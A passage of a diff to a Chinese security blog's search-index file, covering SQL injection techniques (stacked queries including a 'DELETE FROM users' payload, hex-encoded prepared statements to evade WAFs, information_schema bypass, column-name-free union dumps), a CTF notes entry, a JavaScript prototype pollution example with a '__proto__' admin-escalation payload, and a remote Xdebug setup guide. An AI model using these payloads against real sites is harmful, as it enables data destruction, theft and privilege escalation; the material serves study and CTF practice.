+<pre><code>$a = &quot;1;DELETE FROM users&quot;;</code></pre><p>将整个users表全部删除！可见其危害有多大<br>不过一般来说，这种注入的局限比较大…<br>可能数据库引擎不支持，权限不足等…都会导致注入失败，还有就是，结果不一定会有回显…<br>yysy,我刚开始我从字面意思以为是什么数据溢出的骚操作（</p>
+<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="sql预处理语句"><a href="#sql预处理语句" class="headerlink" title="sql预处理语句"></a>sql预处理语句</h4><p>在可以进行堆叠注入时，且像”select、or…“等重要语句被过滤时，可以使用sql预处理语句</p>
+<pre><code>SET @a=&quot;select * from users&quot;; #怎么说？设定了一个a变量
+PREPARE test FROM @a; #使test=@a
+EXECUTE test; #加载test语句</code></pre><p>这样，我们就可以执行@a所设定的语句<br>再来，我们将我们的@a所设定的语句转换为hex，即可绕过大多数的waf<br>这里，我们尝试：</p>
+<pre><code>http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot;
+//select sleep(5);</code></pre><h2 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass - information_schema"></a>bypass - information_schema</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>也不是什么奇技淫巧，只是有其它的类似于information_schema的东西可以用来替代。<br>这里先只给出payload，详细原理之后补上。不知其所以然是不行的。</p>
+<pre><code># 无自增id时
+select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | users,emails,uagents,referers |
++---+---+-------------------------------+
+
+# 有自增id时
+select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()；
++---+---+-------------------------------+
+| 1 | 2 | group_concat(table_name)      |
++---+---+-------------------------------+
+| 1 | 2 | emails,referers,uagents,users |
++---+---+-------------------------------+</code></pre><p><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a><br>原作者说，可能还有更多方式，但我现在时间有限。之后再说。</p>
+<h2 id="as别名的无列名注入"><a href="#as别名的无列名注入" class="headerlink" title="as别名的无列名注入"></a>as别名的无列名注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过as和虚拟表来使数据导入至虚拟表并赋予别名，以此在不知道列名的状况下，通过别名窃取到数据。</p>
+<h3 id="as语句"><a href="#as语句" class="headerlink" title="as语句"></a>as语句</h3><p>要了解此注入先需要知道什么是as。<br>其实也简单，它就是为数据起了一个别名。<br>例如，我使用如下语句查询到了以下结果：</p>
+<pre><code>select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+</code></pre><p>这时候，可能有人不懂洋文(比如我)，这时候我们可以用as语句进行转换：</p>
+<pre><code>select id as 编号,username as 用户名,password as 密码 from users;
++--------+-----------+------------+
+| 编号    |  用户名    | 密码       |
++--------+-----------+------------+
+|      1 | Dumb      | Dumb       |
+|      2 | Angelina  | I-kill-you |
+|      3 | Dummy     | p@ssword   |
+|      4 | secure    | crappy     |
+|      5 | stupid    | stupidity  |
+|      6 | superman  | genious    |
+|      7 | batman    | mob!le     |
+|      8 | admin     | admin      |
+|      9 | admin1    | admin1     |
+|     10 | admin2    | admin2     |
+|     11 | admin3    | admin3     |
+|     12 | dhakkan   | dumbo      |
+|     14 | admin4    | admin4     |
++--------+-----------+------------+</code></pre><p>可以发现，id、username、password都变成了中文。</p>
+<h3 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h3><p>但需要注意的是，这并不是在原表修改的，而是产生了一张虚拟表。这使得我们可以不用查列名即可获得数据。这就让我们可以干一些奇怪的事情。<br>注意，这里需要知道表的列数(其实也容易获取)</p>
+<pre><code>select 1,2,3 as c;
+# 获得了一张虚拟表，最后列名是c
++---+---+---+
+| 1 | 2 | c |
++---+---+---+
+| 1 | 2 | 3 |
++---+---+---+
+
+select 1,2,3 as c union select * from users;
+# 我们发现原有的列名被替换了
++----+----------+------------+
+| 1  | 2        | c          |
++----+----------+------------+
+|  1 | 2        | 3          |
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
++----+----------+------------+
+
+# 这时候，我们就可以对这个虚拟表干一些奇怪的事情
+select group_concat(c) from (select 1,2,3 as c union select * from users) as b;
+# 这里是又建立了另一个表，让他查询我们之前导入了数据的虚拟表，便可以提出数据
+# 注意，新表一定要起别名，不然会报错(指上面的as b)
+# 这个太长了，我就在下面放图片了</code></pre><p><img src="https://www.afkl.ml/usr/uploads/2020/02/531845518.png" alt="getc.PNG" title="getc.PNG"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>网鼎杯2020-小知识点</title>
     <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在网鼎杯中遇见了许多令人迷惑的问题、以及不知道的知识，故在此记录。</p>
@@ -1681,77 +1818,5 @@ php:5.6-apache:
 <p>这么做的目的其实在这次的CTF便可以见得。有时候，服务器会BAN掉不可见的字符，防止这些字符导致系统错误。但对于php的反序列化字符串来说，S类型恰好绕过了这个限制。</p>
 <h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>目前就学到这么多（，之后靠复现来学习吧。<br>当时java的xxe试了半天没有出网，还以为payload的锅，结果复现发现一模一样的payload，buuoj可以出网（指靶机内网）。不知道为什么脑壳痛（<br>还有就是吐槽一下那个<code>/web</code>那个目录有点坑（以后先尝试去读一下<code>httpd.conf</code><br>PS：php真是博大精深（（（</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>Hello World!!!</title>
-    <url>/2020/02/24/Hello-World-0/</url>
-    <content><![CDATA[<p>您好！欢迎来到我的博客！</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>js的继承与原型链污染</title>
-    <url>/2020/07/01/js%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>迷迷糊糊终于搞懂了js的面向对象<del>（大概）</del>，这里简单记个笔记。</p>
-<h1 id="javascipt中的类"><a href="#javascipt中的类" class="headerlink" title="javascipt中的类"></a>javascipt中的类</h1><p>众所周知，javascript虽然可以进行面向对象编程，但其本身是没有class这一概念的。javascript使用function来实现class这一概念。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.test = <span class="string">"aaa"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> o1;</span><br><span class="line"><span class="built_in">console</span>.log(a.test); <span class="comment">//aaa</span></span><br></pre></td></tr></table></figure>
-<p>即使是有class这一关键词，也只是一个语法糖，其本质还是function</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o1</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>() &#123;</span><br><span class="line">		<span class="keyword">this</span>.test = <span class="string">"aaa"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> o1); <span class="comment">//function</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>js的继承有多种方法实现，这里只介绍组合继承</p>
-<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>对于一个类，它有自己的原型对象<code>Class.prototype</code>，通过<code>prototype</code>关键字访问<br>对于一个类的实例（对象），它可以通过<code>__proto__</code>关键词访问对应的原型对象<br>而关键词<code>constructor</code>是上面两个的逆过程<br>一个原型对象也可以通过<code>__proto__</code>访问父级原型对象<br>总结：<br><code>prototype</code> 类的关键词，访问对应原型对象<br><code>__proto__</code> 对象的关键词，访问对应原型对象<br><code>constructor</code> 对象的关键词，访问对应的类</p>
-<p>下例是一个继承链和构造函数的组合继承</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;;</span><br><span class="line">o1.prototype.sayId = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params">id, name</span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>, id);</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1();</span><br><span class="line">o2.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype.constructor = o2;</span><br></pre></td></tr></table></figure>
-<h2 id="o2-prototype-constructor-o2"><a href="#o2-prototype-constructor-o2" class="headerlink" title="o2.prototype.constructor = o2 ???"></a>o2.prototype.constructor = o2 ???</h2><p>请看下例</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.o1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o2 = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o2.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o3 = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">o3.prototype = <span class="keyword">new</span> o2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test = <span class="keyword">new</span> o3;</span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o3);</span><br></pre></td></tr></table></figure>
-<p>请猜猜最后输出什么？<br>最开始我认为对象的constructor应该指向自己的构造函数，所以应该是true？<br>但这是不对的，是false！<br>construstor属性也是可以继承的，这样一层一层继承导致o3继承了o1的construstor<br>我这样写继承是错误的，正确的方法应该是这样的，将原型的construstor重新指向自己的构造函数。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.o1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o1.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o2 = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o2.prototype = <span class="keyword">new</span> o1;</span><br><span class="line">o2.prototype.constructor = o2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    o2.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.o3 = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o3.prototype = <span class="keyword">new</span> o2;</span><br><span class="line">o3.prototype.constructor = o3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test = <span class="keyword">new</span> o3;</span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o1); <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(test.constructor == o3); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h1><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>对于<code>private</code>属性的成员来说来说，它只可以在构造函数内部使用的时候进行访问。<br>根据<code>let</code>关键词的特性（不会变量提升，可以只在块级作用域作用等），它可以作为private使用。<br>同时，对于私有的方法，可以直接套娃实现。这样的函数无法被实例化的对象调用，也不会被继承。<br>如果它可以被外部访问，那它准确来说是一个protected属性。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">private_1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"I am private!"</span>);</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">private_1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"I am private!"</span>);</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test1.private_1()); //error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test2.private_1()); //error</span></span><br><span class="line"><span class="comment">//console.log(test2.private_2()); //error</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="public"><a href="#public" class="headerlink" title="public"></a>public</h2><p>对于public对象，它是可以被外部访问，也可以被继承的。<br>我们只需要用this就可以了</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.public_1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">TheFather.prototype.public_2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.public_3 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //1</span></span><br><span class="line"><span class="comment">//console.log(test1.public_1()); //1</span></span><br><span class="line"><span class="comment">//console.log(test1.public_2()); //1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.b); //2</span></span><br><span class="line"><span class="comment">//console.log(test2.public_1()); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.public_2()); //1</span></span><br><span class="line"><span class="comment">//console.log(test2.public_3()); //2</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h2><p>对于prototype，我们要让只有实例化的对象和子类的对象可以访问它。<br>我们没有具体实现的方法，可以将private属性变得可以访问即可。可以使用一个公用函数访问它。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TheFather</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">this</span>.private_1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">son1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">this</span>.private_2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">son1.prototype = <span class="keyword">new</span> TheFather;</span><br><span class="line">son1.prototype.constructor = son1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test1 = <span class="keyword">new</span> TheFather;</span><br><span class="line"><span class="comment">//console.log(test1.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test1.private_1()); //1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> test2 = <span class="keyword">new</span> son1;</span><br><span class="line"><span class="comment">//console.log(test2.a); //undefined</span></span><br><span class="line"><span class="comment">//console.log(test2.private_1()); //error</span></span><br><span class="line"><span class="comment">//console.log(test2.private_2()); //error</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>因为js的对象继承是基于原型链的，所以如果把上一层的原型污染了就会导致下层的属性被污染。<br>举个例子</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断是否为一个对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isObject</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(a) == <span class="string">"object"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象复制</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span>(isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//user父级对象，有一个判断是否为admin的属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.IsAdmin = <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游客对象，继承user，IsAdmin默认为False</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">guest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.check = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I am guest"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">guest.prototype = <span class="keyword">new</span> user;</span><br><span class="line"></span><br><span class="line"><span class="comment">//管理员对象，继承user，IsAdmin修改为True</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.check = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I am admin"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">admin.prototype = <span class="keyword">new</span> user;</span><br><span class="line">admin.prototype.IsAdmin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> P1 = <span class="keyword">new</span> guest;</span><br><span class="line"><span class="keyword">let</span> P2 = <span class="keyword">new</span> admin;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(P1.IsAdmin); <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(P2.IsAdmin); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设这里可以控制json，提交以下数据污染原型user</span></span><br><span class="line"><span class="keyword">let</span> o1 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__":&#123;"IsAdmin":true&#125;&#125;'</span>);</span><br><span class="line">merge(P1, o1);</span><br><span class="line"><span class="built_in">console</span>.log(P1.IsAdmin); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>javascipt</tag>
-        <tag>对象</tag>
-        <tag>继承</tag>
-        <tag>原型链污染</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次远程调试</title>
-    <url>/2020/07/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>docker for windows就是一个**(无能狂怒)，</del>想build一个环境复现，结果build不起来，无奈使用vps上的docker for linux进行远程调试。这里记录一下如何进行远程调试。</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[win10]-①-&gt;[debian8-②-&gt;[docker]]</span><br></pre></td></tr></table></figure>
-<p>本地环境为win10系统，使用vscode。<br>远程环境为debian8，拥有公网，开启一个docker容器暴露80端口</p>
-<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>选择使用ssh作为第①步的链接<br>首先为vscode安装Remote-SSH扩展</p>
-<p><img src="https://s1.ax1x.com/2020/07/09/UeFICF.png" alt=""></p>
-<p>安装完毕后，右侧栏会多出一个显示器一样的图标，点进后添加链接</p>
-<p><img src="https://s1.ax1x.com/2020/07/09/UekN24.png" alt=""></p>
-<p>之后进行设置<br><code>设置 =&gt; 用户 =&gt; 扩展 =&gt; Remote-SSH =&gt; [Config file &amp; Show Login Terminal]</code></p>
-<p>将自己的ssh config file的path填入config file中，虽然vscode会自动寻找config file，但容易出错。<br>出错的原因应该是环境变量设置有问题，但我乱七八糟的环境变量太多了，懒得搞了=。=</p>
-<p>之后选上Show Login Terminal选项，可以在终端显示密码的输入提示。虽然可以使用公匙登录，但因为windows的权限设置，如果公匙文件的权限没有严格锁死的话是不允许使用的。所以懒癌发作（</p>
-<p>之后按照vscode的提示设置就好<br>成功连接后，我们就相当于在远程服务器的本地进行操纵了。</p>
-<h1 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h1><p>接下来对php进行远程Debug<br>因为php环境是使用Docker环境搭建的，所以在填写launch.json时仍然需要按照远程环境的方法填写。</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Listen for XDebug"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"php"</span>,</span><br><span class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">            <span class="attr">"port"</span>: <span class="number">9000</span>, <span class="comment">//Xdebug的端口</span></span><br><span class="line">            <span class="attr">"stopOnEntry"</span>: <span class="literal">true</span>, <span class="comment">//程序一进入就暂停，个人喜好，可以去掉</span></span><br><span class="line">            <span class="attr">"pathMappings"</span>: &#123; <span class="comment">//远程文件对本地文件的映射</span></span><br><span class="line">                <span class="attr">"/www"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="xdebug-ini"><a href="#xdebug-ini" class="headerlink" title="xdebug.ini"></a>xdebug.ini</h1><p>接下来填写xdebug.ini<br>因为其使用在docker环境，所以有一个专用的host——<code>host.docker.internal</code>来访问到宿主主机</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">zend_extension</span>=xdebug.so</span><br><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="comment">;开启调试</span></span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="literal">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;详见https://xdebug.org/docs/remote#remote_autostart</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;docker特有，指向宿主主机</span></span><br><span class="line"><span class="comment">;2020-7-13更新</span></span><br><span class="line"><span class="comment">;host.docker.internal必然是有对应的host才生效</span></span><br><span class="line"><span class="comment">;但使用debian的镜像时DNS文件有问题，无法解析</span></span><br><span class="line"><span class="comment">;可以尝试172.19.0.1</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span> = host.docker.internal</span><br><span class="line"><span class="attr">xdebug.remote_handler</span> = dbgp</span><br><span class="line"></span><br><span class="line"><span class="comment">;宿主监听的port</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span> = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;将请求来源的ip作为debug响应地址，这里地址可以确切获得就罢了</span></span><br><span class="line"><span class="attr">xdebug.remote_connect_back</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;ide的关键字，这里时VSCODE</span></span><br><span class="line"><span class="attr">xdebug.idekey</span> = VSCODE</span><br><span class="line"><span class="attr">xdebug.auto_trace</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;是否跟踪导入的文件名</span></span><br><span class="line"><span class="attr">xdebug.collect_includes</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">xdebug.collect_params</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_log</span> = /tmp/xdebug.log</span><br></pre></td></tr></table></figure>
-
-<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><p>在设置dockerfile或者docker-compose的端口时，不必将容器内部的9000端口暴露<br>因为xdebug的本质是由ide来开放9000端口接受xdebug的请求，所以暴露容器的9000端口没有用=。=</p>
